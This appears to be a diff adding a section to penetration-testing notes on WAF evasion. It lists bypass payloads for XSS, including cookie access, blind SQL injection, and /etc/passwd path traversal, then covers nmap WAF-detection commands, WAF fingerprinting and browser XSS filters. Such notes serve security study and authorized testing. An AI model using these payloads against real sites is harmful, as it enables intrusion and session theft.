@@ -45,3 +45,149 @@ Evasion in web application security testing refers to the practice of using vari
 - Bypassing Web Application Firewalls (WAFs)/Proxy Rules: WAFs and proxies are designed to filter out malicious requests and prevent attacks like SQL injection or cross-site scripting (XSS). Evasion techniques may involve encoding, obfuscation, or fragmentation of malicious payloads to bypass the WAF's detection rules.
 - Evading Intrusion Detection Systems (IDS): IDS systems monitor network traffic for signs of malicious activity. Evasion techniques can be used to hide or modify the payload of an attack so that it goes undetected by the IDS.
 
+## Solutions for implementing input filtering
+
+WAFs. An well known open source solution is ModSecurity. WAFs use rules to indicate what a filter must block or allow. These rules use Regular Expressions (RE or RegEx).
+
+[See notes on regex](regex.md).
+
+The best solution for protecting a webapp is whitelisting. But blacklisting methods are commonly found in deployments. Blacklisting includes a collection of well-known attacks. There are WAF bypasses.
+
+## WAF bypasses
+
+```
+################
+# XSS: alert('xss') and alert(1)
+################
+prompt('xss')
+prompt(8)
+confirm('xss')
+confirm(8)
+alert(/xss/.source)
+window[/alert/.source](8)
+
+################
+# XSS: alert(document.cookie)
+################
+with(document)alert(cookie)
+alert(document['cookie'])
+alert(document[/cookie/.source])
+alert(document[(/coo/.source+/kie/.source])
+
+################
+# XSS: <img src=x onerror=alert(1);>
+################
+<svg/onload=alert(1)>
+<video src=x onerror=alert(1);>
+<audio src=x onerror=alert(1);>
+
+
+################
+# XSS: javascript:alert(document.cookie)
+################
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+```
+
+
+```
+################
+# Blind SQL injection: 'or 1=1
+################
+' or 6=6
+' or 0x47=0x47
+or char(32)=''
+or 6 is not null
+
+################
+# Blind SQL injection: 'or 1=1
+################
+
+UNION ALL SELECT
+```
+
+
+```
+################
+#  Directory Traversals: /etc/passwd
+################
+/too/../etc/far/../passwd
+/etc//passwd
+/etc/ignore/../passwd
+/etc/passwd.......
+```
+
+```
+################
+#  Webshells: c99.php, r57.php, shell.aspx, cmd.jsp, CmdAsp.asp
+################
+augh.php
+```
+
+### Fingerprinting a WAF 
+
+Tools: [wafw00f](wafw00f.md) and [nmap](nmap.md) script:
+
+```bash
+nmap -p 80 -script http-waf-detect $ip 
+nmap -p 80 -script http-waf-fingerprint $ip 
+```
+
+
+**Detecting a WAF manually**
+
+**1.** *Cookies*: Via cookie values.
+
+| WAF              | Cookie value                                                     |
+| ---------------- | ---------------------------------------------------------------- |
+| Citrix netscaler | ns_af, citrix_ns_id, NSC_                                        |
+| F5 BIG-IP ASM    | TS followed by a string with the regex:<br>`^TS[a-zA-Z0-9]{3,6}` |
+| Barracuda        | barra_counter_session, BNi__BARRACUDA_LB_COOKIE                  |
+
+**2.** *Server cloaking*: WAFs can rewrite Server header to deceive attackers.
+
+**3.** *Response codes*: WAFs can also modify the HTTP response codes if the request is hostile.
+
+**4.** WAFs can be displayed in response bodies, like for instance mod_security, AQTRONIX WebKnight, dotDefender.
+
+**5.** *Drop Action*: WAFs can close the connections in the case they detect a malicious request.
+
+
+## Client-side filters
+
+### Firefox
+
+Browser addons such as [NoScript](https://addons.mozilla.org/en-US/firefox/addon/noscript/) is a whitelist-based security tool that basically disables all the executable web content (javascript, java, flash, silverlight...) and lets the user choose which sites are "trusted". Nice feature: anti-XSS protection.
+
+
+### Internet explorer
+
+Internet Explorer, XSS Filter, which modifies reflected values in the following way:
+
+```
+# This payload
+<svg/onload=alert(1)>
+# is transformed to
+<svg/#nload=alert(1)>
+```
+
+XSS Filter is enabled by default in the Internet but websites that want to opt-out of this protection can use the following response header:
+
+```
+X-XSS-Protection:0
+```
+
+Later on the Internet Explorer team introduced a new directive in the X-XSS-Protection header:
+
+```
+X-XSS-Protection:1; mode=block
+```
+
+With this directive, if a potential XSS attack is detected, the browser, rather than attempting to sanitize the page, will render a simple #. This directive has been implemented in other browsers.
+
+### Chrome
+
+Chrome has XSS Auditor. XSS Auditor is between the HTML Parser and the JS engine.
+
+![XSS auditor](img/xss-auditor.png)
+
+The filter analyzes both the inbound requests and the outbound. If executable code is found within the response, then it stops the script and generates a console alert.
